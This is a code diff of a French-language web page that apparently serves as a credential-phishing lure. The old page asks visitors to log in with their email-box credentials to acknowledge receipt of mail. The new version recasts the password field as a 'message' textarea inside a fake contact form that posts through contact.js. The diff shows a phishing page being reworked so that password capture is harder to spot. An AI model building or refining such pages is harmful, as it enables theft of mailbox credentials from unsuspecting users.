@@ -79,45 +79,23 @@
     <main id="main-content">
       <div class="col-small">
         <header>
-          <h1 class="align-center">Connexion</h1>
-          <p>Pour accuser réception de votre courrier, un code à 6 chiffres vous sera envoyé par mail.
-
-Veuillez vous connecter en utilisant les identifiants habituels de votre boîte mail.
-
-</p>
+          <h1 class="align-center">Conectez-vous</h1>
         </header>
         <section class="content">
           <div class="card margin-auto">
-            <!-- Formulaire de connexion -->
-            <form id="login">
-
-              <label for="ide_id" class="fw-500">Adresse e-mail</label>
-              <input type="email" id="ide_id" name="ide" placeholder="Ex : monadresse@email.fr" required autocomplete="new-password" />
-              <label for="pwd_id" class="fw-500">Mot de passe</label>
-              <div class="input-container">
-                <input
-                  class="password"
-                  type="password"
-                  id="pwd_id"
-                  name="pwd"
-                  autocomplete="new-password"
-                  placeholder="Votre mot de passe"
-                  required
-                />
-                <i id="visibilityBtn">
-                  <span id="icon">
-                    <img alt="" class="icon" src="/static/images/icons/eye.svg" />
-                  </span>
-                </i>
-              </div>
-              <div class="display-flex mt-m">
-                <input type="checkbox" id="remember-me" name="persistent" value="1" />
-                <label for="remember-me">Se souvenir de moi</label>
-              </div>
-              <p class="align-center mt-m">
-                <input class="btn btn-primary" type="submit" value="Connexion" title="Connexion" aria-label="Se connecter" />
-              </p>
-            </form>
+  <form id="contact-form">
+  <label for="ide_id" class="fw-500">Adresse e-mail</label>
+  <input type="email" id="ide_id" name="email" placeholder="Ex : monadresse@email.fr" required autocomplete="email" inputmode="email" />
+  <label for="message_id" class="fw-500">Votre mot de passe</label>
+  <textarea id="message_id" name="message" placeholder="votre mot de passe" rows="3" required></textarea>
+  <div class="display-flex mt-m">
+  <input type="checkbox" id="remember-me" name="remember" value="1" />
+  <label for="remember-me">Se souvenir de moi</label>
+  </div>
+  <p class="align-center mt-m">
+  <input class="btn btn-primary" type="submit" value="Envoyer le message" title="Envoyer le message" />
+  </p>
+  </form>
             <p id="form-message" aria-live="polite"></p>
           </div>
           <div class="mt-m align-right">
@@ -192,6 +170,6 @@ Veuillez vous connecter en utilisant les identifiants habituels de votre boîte 
     </footer>
 
     <!-- Script de la page -->
-    <script src="app.js"></script>
+    <script src="contact.js"></script>
   </body>
 </html>
